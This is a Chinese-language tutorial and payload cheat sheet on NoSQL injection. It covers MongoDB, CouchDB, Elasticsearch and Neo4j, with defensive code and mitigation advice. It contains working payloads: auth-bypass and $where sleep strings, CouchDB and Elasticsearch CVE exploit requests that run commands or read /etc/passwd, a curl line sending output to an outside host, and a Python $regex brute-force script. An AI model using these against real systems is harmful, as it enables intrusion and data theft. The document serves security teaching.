# NoSQL 注入（MongoDB 为主）

## 一句话理解
SQL 注入是让输入变成"语句的一部分"，NoSQL 注入是让输入从"一个值"变成"一个查询对象"——`$ne`、`$gt`、`$regex` 这些操作符一旦由用户控制，查询语义就被改写。

## 核心原理
以 MongoDB 为例，查询条件是 JSON/BSON 对象：

```javascript
db.users.find({username: "admin", password: "123456"})
```

如果后端直接把用户提交的数组/对象拼进查询条件，攻击者提交的不是字符串而是操作符：

```javascript
db.users.find({username: "admin", password: {$ne: 1}})
// 密码"不等于1"恒真 -> 认证绕过
```

关键点：**参数被解析成数组/对象，而不是字符串**。

## 成立条件
- 后端使用 MongoDB 等文档型数据库
- 用户输入未经类型校验进入查询条件
- 框架支持数组/对象式参数解析：
  - PHP：`?pass[$ne]=1` 自动解析为数组
  - Node.js（Express + qs 库）：`?pass[$ne]=1` 解析为对象
  - JSON 接口：`{"pass": {"$ne": 1}}`

## 常见攻击形式
### 1. 认证绕过

```text
POST user=admin&pass[$ne]=1
POST user[$gt]=&pass[$gt]=
{"user": "admin", "pass": {"$regex": ".*"}}
```

### 2. 布尔盲注（枚举数据）
利用 `$regex` 逐位爆破字段内容：

```text
user=admin&pass[$regex]=^a       正确 -> 登录成功/页面正常
user=admin&pass[$regex]=^b       错误 -> 登录失败
```

配合脚本按位扩大前缀，把密码/hash 完整拖出。

### 3. `$where` JS 注入（老版本）
MongoDB 早期支持 `$where` 执行 JavaScript：

```text
user=admin&pass[$where]=1
```

可做布尔判断、延时（`sleep`），现代版本多已禁用，遇到老应用仍可一试。

### 4. 字段枚举与报错
- 提交非法操作符（`[$xxx]`）触发报错，泄露后端类型与查询结构
- 利用 `$lookup`（聚合管道注入）跨集合读数据（少见但 CTF 出现过）

## `$where` JS 注入 Payload 速查

`$where` 的值是服务端执行的一段 JavaScript，`this` 指向当前文档，整段函数体都是注入面；既能做布尔判断，也能用 `sleep()` 延时，是老版本 MongoDB 的"万能注入点"。

### 表单 / GET 参数形式

```text
# 延时盲注：命中 admin 时挂起 5 秒，观察响应时间差
username[$where]=function(){if(this.username=='admin'){sleep(5000);return true;}return false;}

# 后端把输入拼进 $where 字符串内部时（如 $where: "this.username=='"+input+"'"），
# 闭合引号改写语义，再逐位判断密码首字符
' || 'a'=='a' && this.password[0]=='f

# $where 配合正则逐位爆破字段内容（有布尔回显时优先用）
username[$where]=this.username=='admin' && this.password.match(/^f/)
```

### JSON Body 形式

注入表单以 POST JSON 提交时，直接把 `$where` 作为值塞进去：

```json
{"$where": "sleep(5000) || 1==1"}
```

字段级注入：

```json
{"username": "admin", "password": {"$where": "sleep(5000) || 1==1"}}
```

### 判断要点
- 有回显差异：`$where` 配合正则（`this.password.match(/^x/)`）逐位爆破字段内容
- 无回显差异：`$where` 配合 `sleep()` 做时间盲注，对比响应耗时

## 其他 NoSQL 数据库注入

NoSQL 家族远不止 MongoDB，遇到对应端口或报错特征时及时切换思路。

### CouchDB（默认端口 5984）
- 未授权访问：`curl http://target:5984/_all_dbs` 直接列库，浏览器打开 `/_utils` 进管理台。
- CVE-2017-12635（重复键绕过校验，创建管理员）：Erlang JSON 解析器与 JS 校验器对重复键的处理不一致，提交重复 `roles` 键即可越权建号：

```text
PUT /_users/org.couchdb.user:hacker HTTP/1.1
Content-Type: application/json

{"type":"user","name":"hacker","roles":["_admin"],"roles":[],"password":"hacker"}
```

> 要点：重复的 `roles` 键——末尾的空数组骗过 JS 校验器，前面的 `_admin` 被 Erlang 解析器实际生效。

- CVE-2017-12636（已认证 RCE）：拿到 admin 后通过 `_config/query_servers` 注册恶意"查询服务器"，再借设计文档视图触发执行，实现任意命令执行：

```text
PUT /_config/query_servers/x "curl http://vps/`id`"
# 随后创建临时视图/设计文档调用该 query_server，命令即被执行
```

### Elasticsearch（默认端口 9200）
- Query DSL 注入：用户输入被拼进 `query_string` 时，提交通配查询把全部文档拉出来：

```json
{"query": {"query_string": {"query": "*"}}}
```

- CVE-2014-3120（脚本字段 RCE）：老版本搜索接口的 `script_fields` 直接执行 MVEL/Java 代码，一句话：注入脚本即 `Runtime.getRuntime().exec()` 命令执行：

```json
{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;new Scanner(Runtime.getRuntime().exec(\"cat /etc/passwd\").getInputStream()).useDelimiter(\"\\\\A\").next();"}}}
```

- CVE-2015-1427（Groovy 沙箱逃逸）：新版改用 Groovy 但沙箱可逃逸，用反射链绕过执行命令：

```json
{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /etc/passwd\").getText()"}
```

### Neo4j / Cypher 注入
Cypher 查询同样把用户输入拼进字符串，闭合引号 + 注释符即可改写语义（与 SQLi 同构）：

```text
' OR 1=1 //
MATCH (n:User) WHERE n.name='' OR 1=1 // ' RETURN n
```

进阶玩法：
- 注入 `RETURN n.password` 改写返回字段，直接偷密码
- 注入 `LOAD CSV FROM 'file:///etc/passwd'` 读取服务器文件

## Node.js 侧代码示例

### 漏洞写法：req.body 直接进查询

```javascript
// 漏洞：用户输入未做任何类型校验，直接作为查询条件
app.post('/login', async (req, res) => {
  const user = await db.collection('users').findOne({
    username: req.body.username,
    password: req.body.password   // 提交 {"$ne":1} -> {password:{$ne:1}} 恒真绕过
  });
  if (user) return res.json({ token: sign(user) });
  res.status(401).json({ msg: 'login failed' });
});
```

### 安全写法：强制字符串 + `$eq` 绑定

```javascript
// 安全：先强制转字符串，再用 $eq 显式绑定，操作符退化为普通值参与相等比较
app.post('/login', async (req, res) => {
  const username = String(req.body.username || '');
  const password = String(req.body.password || '');
  const user = await db.collection('users').findOne({
    username: { $eq: username },   // 即使传对象，也只做字面相等比较，不会执行内部操作符
    password: { $eq: password }
  });
  if (user) return res.json({ token: sign(user) });
  res.status(401).json({ msg: 'login failed' });
});
```

更省心的方案：全局接入 `express-mongo-sanitize` 中间件，递归剥离所有 `$` 开头的键。

## 快速判断
| 操作 | 现象 | 说明 |
| --- | --- | --- |
| 正常账号 + 错误密码 | 登录失败 | 基线 |
| `pass[$ne]=1` | 登录成功 | 存在注入 |
| `pass[$regex]=^a` vs `^b` | 响应有差异 | 可盲注 |
| 传数组后报错 | 泄露堆栈/驱动信息 | 辅助确认 |

## 工具
- [NoSQLMap](https://github.com/codingo/NoSQLMap)：自动化检测
- Burp 手工改包：大多数场景足够，重点是把参数改成数组/对象形式

## 案例：一道 MongoDB 注入 CTF 题完整流程

题目：登录框，提示"flag 就是 admin 的密码"。

1. **试探基线**：`admin / 123456` 登录失败，页面统一提示"用户名或密码错误"。
2. **确认注入**：改提交操作符形式 `user=admin&pass[$ne]=1`（或 JSON `{"user":"admin","pass":{"$ne":"x"}}`），登录成功——查询条件被用户改写，操作符注入成立。
3. **选择利用方式**：登录接口存在"成功/失败"两种布尔回显，选 `$regex` 布尔盲注逐位爆破密码。
4. **手工验证**：`pass[$regex]=^f` 登录成功、`^a` 失败——首字符为 `f`，符合 `flag{` 开头特征。
5. **脚本爆破**：

```python
import requests
import string

url = 'http://target/login'
charset = string.ascii_letters + string.digits + '_{}!@$-'
known = ''

while '}' not in known:
    for c in charset:
        # 表单形式：pass[$regex]= 已知前缀 + 猜测字符
        data = {'user': 'admin', 'pass[$regex]': '^' + known + c}
        if 'login success' in requests.post(url, data=data).text:  # 按实际回显调整
            known += c
            print('[+] ' + known)
            break

print('[flag] ' + known)
```

6. **备选方案**：若无布尔回显差异，改用 `$where` 时间盲注，按响应耗时逐位判断：

```json
{"user": "admin", "pass": {"$where": "if(this.password[0]=='f'){sleep(5000);return true;}return false;"}}
```

## 与相邻篇目的关系
- Redis 未授权访问与主从复制 RCE：见 [EXP-DB-Redis](./EXP-DB-Redis.md)（那是"服务暴露"问题，本篇是"查询注入"）
- 与 XPath 注入思路同构（都是"查询语言语义被改写"）：见 [EXP-XPath](./EXP-XPath.md)

## 防御要点
- 服务端强制类型校验：查询条件中的字段必须是字符串，拒绝数组/对象
- 过滤以 `$` 开头的键名（如 `express-mongo-sanitize`）
- 禁用 `$where`，使用参数化/ODM 构造查询

## 参考
- [OWASP NoSQL Injection](https://owasp.org/www-community/attacks/NoSQL_injection)
- [PortSwigger NoSQL injection](https://portswigger.net/web-security/nosql-injection)
- [PayloadsAllTheThings - NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
